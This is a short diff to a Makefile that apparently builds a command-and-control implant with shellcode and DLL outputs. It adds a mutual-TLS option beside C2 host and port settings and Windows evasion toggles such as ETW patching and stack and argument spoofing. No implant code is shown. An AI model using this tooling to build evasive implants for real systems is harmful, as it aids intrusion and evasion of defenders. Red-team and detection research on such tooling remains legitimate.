@@ -12,9 +12,10 @@ MACOS_CC = $(shell command -v o64-clang 2>/dev/null || echo clang)
 C2_HOST  ?= 127.0.0.1
 C2_PORT  ?= 8080
 USE_HTTPS ?= 0
+USE_MTLS  ?= 0
 
 # ── Common defines ──
-COMMON_DEFS = -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS)
+COMMON_DEFS = -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS) -DUSE_MTLS=$(USE_MTLS)
 
 # ── Windows evasion toggles ──
 ENABLE_ETW_PATCH     ?= 1
@@ -63,7 +64,7 @@ WIN_CFLAGS += -DENABLE_RET_ADDR_SPOOF=$(ENABLE_RET_ADDR_SPOOF)
 WIN_CFLAGS += -DENABLE_SYNTHETIC_FRAMES=$(ENABLE_SYNTHETIC_FRAMES)
 WIN_CFLAGS += -DENABLE_BLOCK_DLLS=$(ENABLE_BLOCK_DLLS)
 WIN_CFLAGS += -DENABLE_ARG_SPOOF=$(ENABLE_ARG_SPOOF)
-WIN_LDFLAGS = -mwindows -lwinhttp -lws2_32 -lbcrypt -lgdi32 -ladvapi32 -static-libgcc
+WIN_LDFLAGS = -mwindows -lwinhttp -lws2_32 -lbcrypt -lgdi32 -ladvapi32 -lcrypt32 -static-libgcc
 
 # ── Linux flags ──
 LINUX_CFLAGS  = -Wall -Wextra -O2 -s $(COMMON_DEFS)
@@ -133,4 +134,4 @@ all: exe linux-elf
 
 clean:
 	rm -f agent.exe agent.dll agent_pic.dll agent.bin agent_linux agent_macos agent_shellcode.o \
-	      gen_shellcode pic_stub.exe pic_stub.bin
+	      gen_shellcode pic_stub.exe pic_stub.bin include/mtls_cert.h
